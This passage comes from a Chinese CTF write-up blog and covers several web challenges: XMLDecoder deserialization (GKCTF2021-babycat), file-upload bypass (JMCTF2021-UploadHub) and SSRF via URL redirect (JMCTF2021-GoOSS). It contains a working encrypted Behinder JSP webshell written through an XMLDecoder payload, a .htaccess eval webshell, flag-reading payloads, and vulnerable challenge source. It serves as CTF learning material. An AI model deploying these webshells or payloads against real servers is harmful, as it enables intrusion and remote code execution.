<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;java class="java.beans.XMLDecoder"&gt;
    &lt;object class="java.io.PrintWriter"&gt;
        &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/shell.jsp&lt;/string&gt;
        &lt;void method="println"&gt;
            &lt;string&gt;&lt;![CDATA[&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;]]&gt;&lt;/string&gt;
        &lt;/void&gt;
        &lt;void method="close"/&gt;
    &lt;/object&gt;
&lt;/java&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上传文件，文件名改为<code>../db/db.xml</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912193420275.png"></p>
<p>退出用户，重新登录一下，以便触发XMLDecoder，然后蚁剑连接</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912192525117.png"></p>
<p>直接读flag文件没有权限，有个readflag文件，执行，成功获取flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912192617182.png"></p>
<h1 id="GKCTF2021-babycat"><a href="#GKCTF2021-babycat" class="headerlink" title="GKCTF2021-babycat"></a>GKCTF2021-babycat</h1><p>参考<code>GKCTF2021-babycat-revenge</code>，唯一的区别在于<code>uploadServlet.class</code>上传逻辑，此处即使进到if条件里，提示<code>upload failed</code>，依然不影响后续代码执行，也就是实际上依然会被上传</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkExt</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">checkContent</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	req<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"upload failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	req<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"../WEB-INF/upload.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">String</span> filePath <span class="token operator">=</span> uploadPath <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> name <span class="token operator">+</span> ext<span class="token punctuation">;</span>
<span class="token class-name">File</span> storeFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
item<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>storeFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"upload success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>把冰蝎jsp马传到<code>../../static/shell.jsp</code>，连接即可（为什么传到这位置，因为download功能那里的任意文件下载，原始位置就是<code>../../static/cat.gif</code>）</p>
<p><img src="/image/CTF11-GKCTF2021-babycat-revenge.assets/image-20230913162320947.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/cjdgg/article/details/121325745">https://blog.csdn.net/cjdgg/article/details/121325745</a></p>
<p><a href="https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat">https://codex.lemonprefect.cn/writeups/GKCTF%202021.html#babycat</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>目录遍历</tag>
        <tag>XMLDecoder反序列化</tag>
        <tag>java反编译</tag>
        <tag>java代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>JMCTF2021-UploadHub</title>
    <url>/posts/1582c14.html</url>
    <content><![CDATA[<h1 id="JMCTF2021-UploadHub"><a href="#JMCTF2021-UploadHub" class="headerlink" title="JMCTF2021-UploadHub"></a>JMCTF2021-UploadHub</h1><p>知识点概要：文件上传bypass</p>
<p>题目有源码，首页有上传功能</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919141709826.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919153747020.png"></p>
<p><code>index.php</code>上传功能</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919154942975.png"></p>
<p>文件后缀白名单的变量前面是<code>$allow_type</code>，后面是<code>$type</code>，相当于没过滤，可以上传任意文件，同目录是php代码，那么首先思路就是传php文件</p>
<p>但<code>apache2.conf</code>文件有如下内容，禁用了php解析引擎，所以直接上传php文件行不通</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919153231004.png"></p>
<p>可以传<code>.htaccess</code>文件修改解析配置，直接把<code>.htaccess</code>文件本身按照php解析，<code>.htaccess</code>文件内容如下</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch .htaccess&gt;
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
&lt;/FilesMatch&gt;

php_value auto_prepend_file .htaccess
#&lt;?php @eval($_POST['test']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>强制所有匹配的文件被一个指定的处理器处理 用法</p>
<pre class="line-numbers language-none"><code class="language-none">ForceType application/x-httpd-php
SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">Require all granted	# 允许所有请求
php_flag engine on	# 开启PHP解析引擎
php_value auto_prepend_file .htaccess	# 在主文件解析之前自动解析包含.htaccess的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>根据<code>index.php</code>代码逻辑，文件上传好后，文件路径会打印到<code>&lt;img&gt;</code>标签的<code>src</code>属性值</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919155755672.png"></p>
<p>上传成功后，右键查看页面源码，在<code>&lt;img&gt;</code>标签可看到文件路径，直接点击访问即可</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919160358235.png"></p>
<p>由于<code>start.sh</code>有删除上传文件的定时任务，所以可能需要重新传个几次，不过根据<code>index.php</code>22行，文件路径命名不会变，所以还是省了点事</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919160034903.png"></p>
<p>HackBar POST传参，执行<code>phpinfo()</code>如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919155508958.png"></p>
<p>读flag如下</p>
<pre class="line-numbers language-none"><code class="language-none">test=var_dump(file_get_contents("/flag"));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919155634910.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_45669205/article/details/117047432">https://blog.csdn.net/weixin_45669205/article/details/117047432</a></p>
<h2 id="index-php完整代码"><a href="#index-php完整代码" class="headerlink" title="index.php完整代码"></a><code>index.php</code>完整代码</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>生而为人，我很抱歉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>电影太仁慈，总能让错过的人重新相遇；生活不一样，有的人说过再见就再也不见了 -网易云<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span>
<span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>filename:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span> 


<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shuyu"</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">.</span><span class="token string single-quoted-string">'/index.html'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$allow_type</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"bmp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"tar"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fileext</span><span class="token punctuation">,</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">204800</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        
            <span class="token variable">$filename</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into img (filename) values ('<span class="token interpolation"><span class="token variable">$filename</span></span>')"</span><span class="token punctuation">;</span>
            <span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select id from img where filename='<span class="token interpolation"><span class="token variable">$filename</span></span>'"</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$upload</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php?id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$id</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select filename from img where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>
        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token variable">$img</span><span class="token operator">=</span><span class="token variable">$upload</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='<span class="token interpolation"><span class="token variable">$img</span></span>'/&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
      <span class="token selector">body</span><span class="token punctuation">{</span>
   <span class="token property">background</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./back.jpg<span class="token punctuation">)</span></span>  no-repeat right -160px  <span class="token punctuation">;</span>
   <span class="token property">background-size</span><span class="token punctuation">:</span>90%<span class="token punctuation">;</span>
   <span class="token property">background-attachment</span><span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span> 255<span class="token punctuation">,</span> 255<span class="token punctuation">,</span> 0.8<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
      </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件上传bypass</tag>
        <tag>php代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>JMCTF2021-GoOSS</title>
    <url>/posts/2cfe146d.html</url>
    <content><![CDATA[<h1 id="JMCTF2021-GoOSS"><a href="#JMCTF2021-GoOSS" class="headerlink" title="JMCTF2021-GoOSS"></a>JMCTF2021-GoOSS</h1><p>知识点概要：URL重定向漏洞、SSRF</p>
<p>题目有源码，<strong>本文末尾有完整代码</strong></p>
<p>gin框架参考：</p>
<p><a href="https://www.topgoer.com/gin%E6%A1%86%E6%9E%B6/">https://www.topgoer.com/gin%E6%A1%86%E6%9E%B6/</a></p>
<p><a href="https://gin-gonic.com/zh-cn/docs/examples/">https://gin-gonic.com/zh-cn/docs/examples/</a></p>
<p><code>/vul</code>路由关键代码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919092852021.png"></p>
<p>上半部分<code>ShouldBindJSON</code>是json数据的绑定，下半部分<code>url.Url</code>相当于从json数据中取出url键值对，前缀如果不是<code>http://127.0.0.1:1234/</code>，就返回403报错</p>
<p>关于json数据绑定可参考：<a href="https://gin-gonic.com/zh-cn/docs/examples/binding-and-validation/">https://gin-gonic.com/zh-cn/docs/examples/binding-and-validation/</a></p>
<p>然后看<code>fileMidderware</code>中间件关键代码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230919094556741.png"></p>
<p>URL后缀需要是反斜杠<code>/</code>结尾，如果不是反斜杠结尾，就在URL末尾加上反斜杠，然后302重定向访问URL</p>
<p>所以hackbar传递Payload如下（<code>../</code>多一个少一个都不行）</p>
<pre class="line-numbers language-none"><code class="language-none">{"url":"http://127.0.0.1:1234//127.0.0.1/?file=/flag&amp;../../../.."}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个payload跟<code>LineCTF2022-MemoDrive</code>有几分相像之处，个人猜测最后访问的地址应该是<a href="http://127.0.0.1/flag">http://127.0.0.1/../../../../flag</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230918195009913.png" style="zoom:80%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_45805993/article/details/116671017">https://blog.csdn.net/weixin_45805993/article/details/116671017</a></p>
<p><a href="https://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%207/">https://boogipop.com/2023/07/02/BUUCTF%20Web%20WriteUp%207/</a></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><p><code>index.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// php in localhost port 80</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>main.go</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bytes"</span>
	<span class="token string">"crypto/md5"</span>
	<span class="token string">"encoding/hex"</span>
	<span class="token string">"github.com/gin-gonic/gin"</span>
	<span class="token string">"io"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"strings"</span>
	<span class="token string">"time"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> File <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Content <span class="token builtin">string</span> <span class="token string">`json:"content" binding:"required"`</span>
	Name <span class="token builtin">string</span> <span class="token string">`json:"name" binding:"required"`</span>
<span class="token punctuation">}</span>
<span class="token keyword">type</span> Url <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Url <span class="token builtin">string</span> <span class="token string">`json:"url" binding:"required"`</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>data <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span><span class="token punctuation">{</span>
	s <span class="token operator">:=</span> md5<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> hex<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> fileMidderware <span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span><span class="token punctuation">{</span>
	fileSystem <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files/"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	f<span class="token punctuation">,</span>err <span class="token operator">:=</span> fileSystem<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> f <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	<span class="token comment">//</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		c<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	fi<span class="token punctuation">,</span> err <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Stat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span>  err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
